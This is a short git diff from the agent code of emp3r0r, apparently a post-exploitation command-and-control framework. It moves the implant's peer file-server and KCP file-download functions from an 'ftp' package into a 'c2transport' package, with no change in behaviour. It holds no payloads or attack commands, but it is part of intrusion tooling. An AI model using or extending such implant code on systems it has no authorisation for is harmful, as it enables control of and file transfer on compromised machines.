@@ -15,7 +15,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/ftp"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/proxychain"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/ssh"
@@ -330,15 +329,15 @@ func runFileServer(cmd *cobra.Command, args []string) {
 		return
 	}
 	if serverSwitch == "on" {
-		if ftp.FileServerCtx != nil {
-			ftp.FileServerCancel()
+		if c2transport.FileServerCtx != nil {
+			c2transport.FileServerCancel()
 		}
-		ftp.FileServerCtx, ftp.FileServerCancel = context.WithCancel(context.Background())
-		go ftp.FileServer(portInt, ftp.FileServerCtx, ftp.FileServerCancel)
+		c2transport.FileServerCtx, c2transport.FileServerCancel = context.WithCancel(context.Background())
+		go c2transport.FileServer(portInt, c2transport.FileServerCtx, c2transport.FileServerCancel)
 		c2transport.C2RespPrintf(cmd, "File server on port %s is now %s\n", port, serverSwitch)
 	} else {
-		if ftp.FileServerCtx != nil {
-			ftp.FileServerCancel()
+		if c2transport.FileServerCtx != nil {
+			c2transport.FileServerCancel()
 		}
 		c2transport.C2RespPrintf(cmd, "File server on port %s is now %s\n", port, serverSwitch)
 	}
@@ -354,7 +353,7 @@ func runFileDownloader(cmd *cobra.Command, args []string) {
 		return
 	}
 	downloadPath := fmt.Sprintf("%s/%s", common.RuntimeConfig.AgentRoot, util.FileBaseName(path))
-	err := ftp.DownloadFromPeerKCP(url, path, downloadPath, checksum)
+	err := c2transport.DownloadFromPeerKCP(url, path, downloadPath, checksum)
 	if err != nil {
 		c2transport.C2RespPrintf(cmd, "Error: %v\n", err)
 		return
